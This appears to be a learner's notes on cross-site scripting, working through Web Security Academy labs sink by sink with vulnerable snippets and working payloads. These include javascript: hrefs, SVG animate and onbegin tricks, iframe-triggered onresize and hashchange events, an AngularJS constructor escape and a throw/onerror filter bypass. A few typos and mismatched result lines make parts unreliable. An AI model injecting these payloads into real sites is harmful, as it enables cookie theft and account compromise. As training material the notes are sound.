# XSS examples

# sink: `document.write`, source: `location.search`

`document.write('... <script>alert(document.domain)</script> ...');`

payload:

`/?search=smn123"><script>alert('XSS+by+Vickie')%3B<%2Fscript>`

result in the code:

1.

```html
<img src="/resources/images/tracker.gif?searchTerms=smn123"> <script>alert('XSS by Vickie');</  script>
```

2. something similar: /product?productId=1&storeId=smn12</select><script>alert("q")</script>


# sink: `innerhtml`, source: `location.search`


`innerhtml` doesn't accept `<script>` or `<svg> onload`, use `<img>` or `<iframe>`.

source code:

```js
function doSerachQuery(query) {
    document.getElementById('searchMessage').innerHTML = query;
}
```

payload: `</span><img src=1 onerror=alert(document.domain)>`

# jQuery anchor sink `href` attribute


third party frameworks introduce new sources and sinks. [jQuery selectors](jQuery.md)

URL:

`https://0a99001c0357321a81887acb00d8006d.web-security-academy.net/feedback?returnPath=/`

source code:

```js
(function() {
$('#backLink').attr("href",(new URLSearchParams(window.location.search)).get('returnUrl'));
});
```

sets whatever is in `returnPath` in the `herf` of `backLink`.
`href` is used for redirection, so we use a payload with `javascript`.

payload:

`javascript:%20alert(document.cookie)` so `https://0a99001c0357321a81887acb00d8006d.web-security-academy.net/feedback?returnPath=javascript:%20alert(document.cookie)`

result in the code:

`<a id="backLink" href="javascript: alert(document.cookie)">Back</a>`

# jQuery sink: `selector` using a `hashchange` event

`$()` selector function, can be used to inject malicious objects into the DOM.
`hash` is user controllable and could be used to inject into the `$()`.

source:

`hashchange` event handler: on `hashchange`, performs the following function; uses
a *selector* to find the given fragment, then scrolls to it.
you should send the exploit to the victim so that it triggers a `hashchange` event, when it's loaded.

```js
$(window).on('hashchange', function() {
  var element = $(location.hash);
  element[0].scrollIntoView(); });
```

payload:

trigger a `hashchange` event without user interaction:

`<iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">`
changes the fragment on load, activating a `hashchange` event, then the selector adds it to the DOM.

# AngularJS expression with angle brackets and double quotes HTML-encoded

* if it has `ng-app` (directive)  somewhere: then it's using angular, so you
  can run js inside {{}}. so, sending {{1+1}}, returns 2.

  but something like this: `{{alert()}}` doesn't work, perhaps because there is some
  protections.

  using this, in the search box with angle bracket encoded: `{{$eval.constructor('alert(1)')()}}`
  * the `()` in the end, call the function we defined before it.
  * more on how this works `https://www.youtube.com/watch?v=QpQp2JLn6JA`

```js
<script>
    var searchTerms = '';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```


# Reflected XSS: event handlers and `href` attributes blocked

first brute forcing to see tags and events available:

`svg` tag is available:

The svg element is a container that defines a new coordinate system and
viewport and is used to create and display graphics on the web.

trying:

```html
<svg width="200" height="200">
    <a>
       <text>Click me</text>
    </a>
</svg>
```


If text is included in SVG not inside of a `<text>` element, it is not rendered.

`<svg><a><text x=20 y=20>Click me</text></a></svg>`
having x,y helps to actually display the text. 

`svg` accepts an `<animate>` element which could be used to set attributes.
`<svg><a><animate attributeName="href" values="javascript:alert()"></animate><text x=20 y=20>Click me</text></a></svg>`

# Reflected XSS with some SVG markup allowed

test a typical payload: `<img src=1 onerror=alert(1)>`

bruteforce tags.

`?search=<$$>`

there is an SVG and elements we can put inside it.

bruteforce for events.

`?search=<SVG><animateTransform%20$$=1>`

`onbegin` is found

payload: `<svg><animateTransform onbegin="alert()"></animateTransform></svg>`


# Reflected XSS into HTML context with most tags and attributes blocked

`<>` aren't filtered.
`<body>` isn't filtered.

some attributes are filtered. bruteforce to see the allowed ones:

`GET /?search=<body%20$=1> HTTP/2` the `$` will be bruteforced.

how to envoke the attack without user interaction:

but we can't use `onload`. or can we?

solution? run the page inside an `iframe`, on an attacker controlled page.
we can resize the iframe on page load and the XSS will be executed automatically.

it needs that the victim to visit the attacker controlled page.

`<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E "onload=this.style.width='100px'>`

the iframe being resized as soon as it's loaded, triggering `onresize` events.

# Reflected XSS just custom tags allowed

`<script>` `<h1>` don't work

`<custom-tags>` works and we see it reflected in page's html.

and then this gives us an alert:
`<custom-tags onmouseover="alert()">`

how to make it automatic (user doesn't have to do anything (mouseover))?

`<custom-tags id="x" onfocus="alert(document.cookie)" tabindex="1">`

`onfocus`: using tab or mouse click, e.g. you will see a cursor indicating
you can type there.
and might even be true on none inputting elements. if they have `tabindex="1"`

`id="x"`: focus on a specific element (bookmarking, `hashchange`?).

so at the end: if we append `#x` to the page that contains the payload, it will
be focused on it and alerted:

`/?search=<custom-tags id="x" onfocus="alert(document.cookie)" tabindex="1">#x`

how to use js to redirect the victim's browser to the desired url?

if the victim visits an attacker controlled domain, the attacker can run js on
his browser, redirecting him to the URL.

`<script>
location="https://0a37005b03aa29a384e1193d0017008a.web-security-academy.net/?search=%3Ccustom-tags+id%3D%22x%22+onfocus%3D%22alert%28document.cookie%29%22+tabindex%3D%221%22%3E/#x"
</script>

# angle brackets encoded

```
javascript:/*--></title></style></textarea></script></xmp>
<svg/onload='+/"`/+/onmouseover=1/+/[*/[]/+alert(42);//'>
```

with angle brackets encoded:
this: `https://0a2a0022043296d88235b085003d00fa.web-security-academy.net/?search=%3Cscript%3Ealert%28%27XSS+by+Vickie%27%29%3B%3C%2Fscript%3E`
will cause this: `<input type="text" placeholder="Search the blog..." name="search" value="" &lt;script&gt;alert('xss="" by="" vickie');&lt;="" script&gt;i">`

payload:

a payload without angle brackets: `/?search="onmouseover="alert(1)`: 

result in code:

```html
<input type="text" placeholder="Search the blog..." name="search" value="" onclick"alert(1)">
```

also this: `<a id="author" href="javascript:alert(1)">test</a>`

# Reflected XSS in canonical link tag

websites could encode angle brackets but you could still inject attributes.

*canonical link* is a tag in the source code of a page that indicates to search
engines that a master copy of the page exists, to avoid confusion on duplicate
documents.

*access keys* allow to provide keyboard shortcut that when pressed will cause
an event to fire.

this is the canonical link in the code:

`<link rel="canonical" href='https://0aba0085031513cc809f1c7200380018.web-security-academy.net/'>`

it's easy to inject something like `onclick=alert()` but we won't be able to
see it because it inside the `head` tag. we should use `accesskey`.

payload: `/?' accesskey='Alt+x' onclick='alert()`

# Stored XSS into anchor `href` attribute with double quotes HTML-encoded

payload: `javascript:alert(1)`

# Reflected XSS into a JavaScript string with angle brackets HTML encoded

```js
<script>
var searchTerms = '123';
document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```

say we add this: `123'; alert();` it won't execute, because there will be an
excess `'` left which breaks the code: `'123';alerr();';...`

but this: `123'; alert(); let var = 'test` works.

Payload: `'-alert()-'`

result: `var searchTerms = ''-alert()-'';`


# Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped

`';alert(document.domain)//` is converted to `\';alert(document.domain)//`

add a `\` =>  `\';alert(document.domain)//`, so it escapes the one is added by the app:`\\';alert(document.domain)//`

or `\'-alert(1)//`


# Reflected XSS in a javascript URL with some characters blocked

characters could be restricted, on the website or a WAF blocking the
request.

another method of calling functions:

- use `throw` with exception handler: `onerror=alert;throw 1`

Assigns `alert()` to global exception handler, then `throw 1`, passes 1 to the
exception handler (throws an error?).

payload:
`post?postId=5&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'`


`throw` returns the last value in the comma separated list:

`throw/**/onerror=alert,1337`

  * `onerror` is JavaScript's error handler.
  * `onerror=alert` assigns alert() to `onerror`, overwriting `error()` to do
    `alert()`
  * the error is going to throw the value `1337`.
    we won't have `uncought` (default error handler behaviour) but `1337` alerted.

`x=x=>{throw/**/onerror=alert,1337}`

  * an arrow function:

    we can't write it like `x=()=>` (as it's supposed to be written) because `()` will be blocked,so: `x=x=>`.

    also no spaces, it's going to break the url.

  * now the `throw` is inside the function, so it happens if it's called.

`toString=x`

  * it's default behaviour is to convert a data type to string.
  * but now `toString` is the function `x`.
  * so whenever JavaScript calls `toString` it's going to call `x`.

`window+""`

  * string concatenation, so `toString` is used by JavaScript.

the js code to be injected in:

`<a href="javascript:fetch('/analytics', {method:'post',body:'/post%3fpostId%3d4'}).finally(_ => window.location = '/')">`

`fetch`: dispatching http requests and manipulating response, the url is `/analytics` and other http request data.

we are inside the configuration options object of the `fetch` method and we should break out and add another option to the `fetch` API.

with our payload we send three argument instead of two to `fetch`, but it doesn't consider the excess, but we can use it to assign a value to a variable.

* `&`: in browser term: the next key value pair. it allows the page to
  continue working.

* `/**/` we can't inject spaces, but it's needed.

# Reflected XSS into a JavaScript template literals, with `<>'"\` unicode escaped.

js template literals are string literals that allow embedded js expressions:

```js
<script>
var message = `0 search results for '123'`;
document.getElementById('searchMessage').innerText = message;
</script>
```

use `${}` to embed as expression to be executed: `${alert()}`

`var message = `0 search results for '${alert()}'`;`


# Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped

`<a id="author" href="http://test.com" onclick="var tracker={track(){}};tracker.track('http://test.com');">t</a>`

if there isn't a single quote, it won't be escaped.
payload: `http://test.com&apos;-alert(document.domain)-&apos;`